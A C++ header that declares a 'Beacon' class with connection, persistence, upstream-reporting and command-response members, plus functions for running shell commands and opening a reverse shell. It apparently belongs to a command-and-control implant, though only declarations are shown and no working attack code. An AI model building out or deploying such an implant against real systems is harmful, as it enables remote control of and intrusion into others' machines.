#include <string>
#include <vector>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

typedef std::vector<std::string> ARGS;
class Beacon {
    public:
        Beacon(int id, int port, const char* attached_to);
        bool alive;
        bool persistent;
        const char *get_ip();
        bool establish();
        std::string set_update(int status, std::string cout, bool alive, bool persistent);
        int send_upstream(std::string update);
        void await_update();
        std::string respond(std::string);
    private:
        int id;
        int port;
        const char* attached_to;
};

const char *get_ip_addr();

std::string exec(const char *cmd);

int revshell(ARGS);

